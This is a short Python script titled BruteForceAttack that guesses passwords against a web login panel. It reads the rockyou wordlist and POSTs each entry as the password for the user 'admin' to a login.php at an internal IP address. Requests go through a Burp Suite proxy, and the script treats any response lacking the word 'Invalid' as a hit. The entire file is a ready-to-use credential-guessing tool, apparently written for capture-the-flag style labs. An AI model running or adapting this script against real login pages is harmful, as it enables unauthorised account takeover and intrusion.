#!/usr/bin/python3

#########################################################################################################
#                                                                                                       #
#   Title: BruteForceAttack                                                                             #
#   Description: Make a simple Brute Force Atack against a login panel that doesn't require CSRF token  #
#   Author: S0ftD3ath - N3Gtune                                                                         #
#                                                                                                       #
#########################################################################################################

import requests
#import threading
import os
import signal
import sys

# Global Variables
url = 'http://10.10.11.104/login.php' # <-- Change this
username = 'admin' # <-- Change this
error_word = 'Invalid' # <-- Change this
passwords = '/usr/share/wordlists/rockyou.txt'
#threads = 20
proxy = {"http": "http://127.0.0.1:8080"} # Intercept with burpsuite

# Colors
class bcolors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKCYAN = '\033[96m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'

#Ctrl+C
def def_handler(sig, frame):
    print(bcolors.WARNING + '\n[!] Exiting...' + bcolors.ENDC)
    sys.exit(1)

signal.signal(signal.SIGINT, def_handler)

# Print start banner
def printBanner():

    if os.name == 'posix':
        os.system('clear')
    else:
        os.system('cls')

    print(bcolors.FAIL + """\n
 /$$   /$$  /$$$$$$   /$$$$$$    /$$                                  
| $$$ | $$ /$$__  $$ /$$__  $$  | $$                                  
| $$$$| $$|__/  \ $$| $$  \__/ /$$$$$$   /$$   /$$ /$$$$$$$   /$$$$$$ 
| $$ $$ $$   /$$$$$/| $$ /$$$$|_  $$_/  | $$  | $$| $$__  $$ /$$__  $$
| $$  $$$$  |___  $$| $$|_  $$  | $$    | $$  | $$| $$  \ $$| $$$$$$$$
| $$\  $$$ /$$  \ $$| $$  \ $$  | $$ /$$| $$  | $$| $$  | $$| $$_____/
| $$ \  $$|  $$$$$$/|  $$$$$$/  |  $$$$/|  $$$$$$/| $$  | $$|  $$$$$$$
|__/  \__/ \______/  \______/    \___/   \______/ |__/  |__/ \_______/
                                                                      
                                                                      
                                                           S0ftD3ath ♆                                                                  
    """ + bcolors.ENDC)


def makeRequest():
    print(bcolors.OKGREEN + "\n[*] Performing Brute Force Attack against the url %s using the username %s, go grab some takis, this could take a while." % (url, username) + bcolors.ENDC)
    
    try:
        # Open file
        with open(passwords, "r") as f:
            # iterate each line of the file
            for line in f:
                # Data to post
                data = {
                    'username': username,
                    'password': line
                }

                r = requests.post(url, data=data, proxies=proxy)
                if error_word not in r.text:
                    print('\n[*] %s is the correct password for %s, I hope :P' % (line, username))
                    sys.exit(0)

    except Exception as err:
        # Show error message
        print(bcolors.FAIL + '\n[x] Something went wrong' + bcolors.ENDC)
        print(err)

if __name__ == '__main__':
    
    printBanner()
    makeRequest()

